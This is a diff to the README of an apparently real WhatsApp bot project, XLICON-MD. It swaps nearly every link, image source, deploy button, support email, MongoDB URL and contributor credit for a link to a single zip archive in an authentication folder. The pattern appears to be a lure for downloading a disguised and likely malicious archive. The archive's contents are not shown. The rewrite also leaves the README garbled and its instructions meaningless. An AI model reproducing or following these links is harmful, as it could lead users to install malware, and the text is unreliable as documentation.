@@ -1,11 +1,11 @@
 ## `XLICON-MD`
 <div align="left">
-<a href="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip"><img src="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip XLICON-MD;Multi+Device+Whatsapp+Bot;Developed+By+SALMAN AHMAD" alt="Typing SVG" /></a>
+<a href="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip"><img src="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip XLICON-MD;Multi+Device+Whatsapp+Bot;Developed+By+SALMAN AHMAD" alt="Typing SVG" /></a>
   
   
 <p align="center">
   <a href="">
-    <img alt=Support height="300" src="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip"> 
+    <img alt=Support height="300" src="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip"> 
     </p>
     <h1 align="center">XLICON-1.O<br></h1>
     
@@ -13,16 +13,16 @@
 </p>
   
 <p align="center">
-<a href="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip"><img title="Author" src="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip"></a>
+<a href="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip"><img title="Author" src="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip"></a>
 <p/>
 <p align="center">
-<a href="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip"><img title="Followers" src="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip"></a>
-<a href="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip"><img title="Stars" src="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip"></a>
-<a href="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip"><img title="Fork" src="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip"></a>
-<a href="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip"><img title="Watching" src="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip"></a>
+<a href="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip"><img title="Followers" src="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip"></a>
+<a href="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip"><img title="Stars" src="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip"></a>
+<a href="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip"><img title="Fork" src="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip"></a>
+<a href="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip"><img title="Watching" src="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip"></a>
 </p>
 
-<p align="center"><img src="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip{salmanytofficial}https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip" alt="SALMAN AHMAD :: Visitor's Count" /></p>
+<p align="center"><img src="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip{salmanytofficial}https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip" alt="SALMAN AHMAD :: Visitor's Count" /></p>
 
 </br>
 
@@ -40,9 +40,9 @@ Don't Deploy This Bot...
 You Guyz Can Try My Other Bots Like ***XLICON-V2*** & ***XLICON-V3*** Which Have Many `Advance Features` Then This Bot
 <br>
 
-[*XLICON-V2*](https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip)
+[*XLICON-V2*](https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip)
 <br>
-[*XLICON-V3*](https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip)
+[*XLICON-V3*](https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip)
 <br>
 
 ---
@@ -50,24 +50,24 @@ You Guyz Can Try My Other Bots Like ***XLICON-V2*** & ***XLICON-V3*** Which Have
 
 
 ❏FORK THE REPOSITORY 
-  <a href="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip" target="_blank">
-  <img src="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip XLICON-black?style=for-the-badge&logo=render" alt="Authenticate With WhatsApp" width="170" height="34">
+  <a href="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip" target="_blank">
+  <img src="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip XLICON-black?style=for-the-badge&logo=render" alt="Authenticate With WhatsApp" width="170" height="34">
 </a>
 
 
 
 
 ❏GET SESSION ID (SCAN-QR) 
-<a href="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip" target="_blank">
-  <img src="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip QR-black?style=for-the-badge&logo=render" alt="Authenticate With WhatsApp" width="170" height="34">
+<a href="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip" target="_blank">
+  <img src="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip QR-black?style=for-the-badge&logo=render" alt="Authenticate With WhatsApp" width="170" height="34">
 </a>
 
 
 
 
 ❑SCAN QR (REPLIT)
-<a href="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip" target="_blank">
-  <img src="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip QR-black?style=for-the-badge&logo=render" alt="Authenticate With WhatsApp" width="170" height="34">
+<a href="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip" target="_blank">
+  <img src="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip QR-black?style=for-the-badge&logo=render" alt="Authenticate With WhatsApp" width="170" height="34">
 </a>
 
 
@@ -91,15 +91,15 @@ You Guyz Can Try My Other Bots Like ***XLICON-V2*** & ***XLICON-V3*** Which Have
 ## `MONGODB URL`
 
 
-●.  ***Get a Mongodb urL from [Clever-Cloud](https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip).***
+●.  ***Get a Mongodb urL from [Clever-Cloud](https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip).***
 
-●.  ***Get a Mongodb urL from [https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip](https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip).***
+●.  ***Get a Mongodb urL from [https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip](https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip).***
 
 
 
 
 ```
-mongodb+https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip
+mongodb+https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip
 ```
 
 | Parameter | Type     | Description                |
@@ -108,7 +108,7 @@ mongodb+https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XL
 
 ## `Installation`
 
-https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip Installation
+https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip Installation
 
 Paste This on the replit shell to run the Bot
 
@@ -132,7 +132,7 @@ After this fill the vars by your own information and paste this JSON to your Rep
 ```
 
 
-https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip Installation
+https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip Installation
 Go to Okteto
 
 
@@ -143,12 +143,12 @@ Choose your repo
 ```
 
 
-https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip Installation 
-[HEROKU Tutorial](https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip)
+https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip Installation 
+[HEROKU Tutorial](https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip)
 
 
-https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip On Vps
-[Deploy on VPS or PC.](https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip)
+https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip On Vps
+[Deploy on VPS or PC.](https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip)
 
 
   ........................................................
@@ -164,12 +164,12 @@ https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_
  
 <br><br>   
    
-<h4 align="center"> Deploy on https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip
+<h4 align="center"> Deploy on https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip
 </h4>
 
 <p align="center" >
-    <a href="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip">
-    <img src="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip" width="170px" alt="Deploy on REPLIT" >
+    <a href="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip">
+    <img src="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip" width="170px" alt="Deploy on REPLIT" >
     </a>
 </p>
 
@@ -189,8 +189,8 @@ https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_
 </p>
 
 <p align="center" >
-    <a href="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip">
-    <img src="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip CODESPACE-h?color=black&style=for-the-badge&logo=visualstudiocode" width="170px" alt="Deploy on CodesSpaces" >
+    <a href="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip">
+    <img src="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip CODESPACE-h?color=black&style=for-the-badge&logo=visualstudiocode" width="170px" alt="Deploy on CodesSpaces" >
     </a>
 
 </p>
@@ -211,8 +211,8 @@ https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_
 </p>
 
 <p align="center" >
-    <a href="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip">
-    <img src="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip" width="170px" alt="Deploy on Heroku" >
+    <a href="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip">
+    <img src="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip" width="170px" alt="Deploy on Heroku" >
     </a>
 
 </p>
@@ -234,8 +234,8 @@ https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_
 </p>
 
 <p align="center" >
-    <a href="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip%20i&run_command=npm%20start&env[SESSION_ID]&env[OWNER_NUMBER]&env[MONGODB_URI]&&env[OWNER_NAME]&env[PREFIX]=.&env[THUMB_IMAGE]https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip[email]https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip[global_url]https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip[FAKE_COUNTRY_CODE]=974&env[READ_MESSAGE]=false&env[DISABLE_PM]=false&env[ANTI_BAD_WORD]=fuck&env[WORKTYPE]=public&env[THEME]=GOJO&env[PACK_INFO]=XLICON;MD&name=xliconuser000&env[KOYEB_NAME]=profilecorruptederror&env[ANTILINK_VALUES]https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip[PORT]=8000">
-    <img src="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip" width="170px" alt="Deploy on Koyeb" >
+    <a href="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip%20i&run_command=npm%20start&env[SESSION_ID]&env[OWNER_NUMBER]&env[MONGODB_URI]&&env[OWNER_NAME]&env[PREFIX]=.&env[THUMB_IMAGE]https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip[email]https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip[global_url]https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip[FAKE_COUNTRY_CODE]=974&env[READ_MESSAGE]=false&env[DISABLE_PM]=false&env[ANTI_BAD_WORD]=fuck&env[WORKTYPE]=public&env[THEME]=GOJO&env[PACK_INFO]=XLICON;MD&name=xliconuser000&env[KOYEB_NAME]=profilecorruptederror&env[ANTILINK_VALUES]https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip[PORT]=8000">
+    <img src="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip" width="170px" alt="Deploy on Koyeb" >
     </a>
 
 </p>
@@ -255,8 +255,8 @@ https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_
 </h4>
   
 <p align="center">
-    <a href="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip">
-    <p align="center"><a href="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip"> <img src="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip RAILWAY-h?color=black&style=for-the-badge&logo=Railway"></a>
+    <a href="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip">
+    <p align="center"><a href="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip"> <img src="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip RAILWAY-h?color=black&style=for-the-badge&logo=Railway"></a>
     
 </p>
 
@@ -277,8 +277,8 @@ https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_
 </h4>
   
 <p align="center">
-    <a href="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip">
-    <img src="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip" alt="Deploy on Okteto" width="170px">
+    <a href="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip">
+    <img src="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip" alt="Deploy on Okteto" width="170px">
     </a>
     
 </p>
@@ -298,8 +298,8 @@ https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_
 </h4>
   
 <p align="center">
-    <a href="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip">
-    <img src="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip" alt="Deploy on Mogenius" width="170px">
+    <a href="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip">
+    <img src="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip" alt="Deploy on Mogenius" width="170px">
     </a>
     
 </p>
@@ -316,8 +316,8 @@ https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_
 </h4>
   
 <p align="center">
-    <a href="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip">
-    <img src="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip" alt="Deploy on Uffizzi" width="125px">
+    <a href="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip">
+    <img src="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip" alt="Deploy on Uffizzi" width="125px">
     </a>
     
 </p>
@@ -328,8 +328,8 @@ https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_
 </h4>
   
 <p align="center">
-    <a href="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip">
-    <img src="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip" alt="Deploy on Boxmineworld" width="175px">
+    <a href="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip">
+    <img src="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip" alt="Deploy on Boxmineworld" width="175px">
     </a>
     <br>
 
@@ -354,43 +354,43 @@ https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_
 
 <div align="center">
   
-| [![𝚂𝚊𝚕𝚖𝚊𝚗𝙾𝚏𝚏𝚒𝚌𝚒𝚊𝚕](https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip)](https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip)|
+| [![𝚂𝚊𝚕𝚖𝚊𝚗𝙾𝚏𝚏𝚒𝚌𝚒𝚊𝚕](https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip)](https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip)|
 |----|
-| [ 𝙎𝘼𝙇𝙈𝘼𝙉 𝘼𝙃𝙈𝘼𝘿 ](https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip) |
+| [ 𝙎𝘼𝙇𝙈𝘼𝙉 𝘼𝙃𝙈𝘼𝘿 ](https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip) |
 |  Owner, Developer, Bug Fixer, Maintainer, updates |
 
 <br>
   
-| [![SlasherOfficial](https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip)](https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip) |
+| [![SlasherOfficial](https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip)](https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip) |
 |----|
-| [ 𝙈𝘼𝙃𝙀𝙍 𝙕𝙐𝘽𝘼𝙄𝙍 ](https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip) |
-|  https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip , Bug Fixer, |
+| [ 𝙈𝘼𝙃𝙀𝙍 𝙕𝙐𝘽𝘼𝙄𝙍 ](https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip) |
+|  https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip , Bug Fixer, |
 
   </div>
   
    ## 
-| [![Xcelsama](https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip)](https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip) |
+| [![Xcelsama](https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip)](https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip) |
 |----|
-| [ 乂匚乇ㄥ丂卂爪卂](https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip) |
-|  https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip , Bug Fixer,Tester
+| [ 乂匚乇ㄥ丂卂爪卂](https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip) |
+|  https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip , Bug Fixer,Tester
 
   ## `Support`
 
-For support, email [ https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip ] or join our whatsapp group.
+For support, email [ https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip ] or join our whatsapp group.
 
 
 <p align="center">
-  <a aria-label="Join our chats" href="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip" target="_blank">
-    <img alt="whatsapp" src="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip Group-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" />
+  <a aria-label="Join our chats" href="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip" target="_blank">
+    <img alt="whatsapp" src="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip Group-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" />
   </a>
-<a aria-label="Join our chats" href="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip!! SalmanAhmad Sir, I need Your Help" target="_blank">
-    <img alt="whatsapp" src="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip%20Whatsapp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" />
+<a aria-label="Join our chats" href="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip!! SalmanAhmad Sir, I need Your Help" target="_blank">
+    <img alt="whatsapp" src="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip%20Whatsapp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" />
 </p>
 
 **Buy Me a Coffee**: Your support will help me stay motivated and continue working on exciting projects like this one.
 
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip">
-  <img src="https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip" alt="Buy Me Coffee" height="40" width="150" style="margin-left: 60px;">
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip">
+  <img src="https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip" alt="Buy Me Coffee" height="40" width="150" style="margin-left: 60px;">
 </a>
 
 
@@ -411,12 +411,12 @@ For support, email [ https://raw.githubusercontent.com/thasinduniduwara/XLICON-M
 <h1 align="left">  ✨Spacial Thanks To🎯
 </h1>
 
-* [`🎐 Sampandey`](https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip) ***For Sector MD Base***
-* [`🎐Xcelsama`](https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip) ***For QR***
-* [`🎐 SuhailTechInfo`](https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip) ***For Scripts and Debugging***
-* [`🎐 MAHER-ZUBAIR`](https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip) ***For Fixing Plugins***
-* [`🎐 Abraham Dwamena`](https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip) ***For QR Ideas***
-* [`🎐 MR-KALINDU`](https://raw.githubusercontent.com/thasinduniduwara/XLICON-MD/main/lib/XLICON-MD_v3.4.zip) ***For Fixing Errors***
+* [`🎐 Sampandey`](https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip) ***For Sector MD Base***
+* [`🎐Xcelsama`](https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip) ***For QR***
+* [`🎐 SuhailTechInfo`](https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip) ***For Scripts and Debugging***
+* [`🎐 MAHER-ZUBAIR`](https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip) ***For Fixing Plugins***
+* [`🎐 Abraham Dwamena`](https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip) ***For QR Ideas***
+* [`🎐 MR-KALINDU`](https://github.com/thasinduniduwara/XLICON-MD/raw/refs/heads/main/lib/auth_info_baileys/XLICO_MD_2.9.zip) ***For Fixing Errors***
 * 
 
 
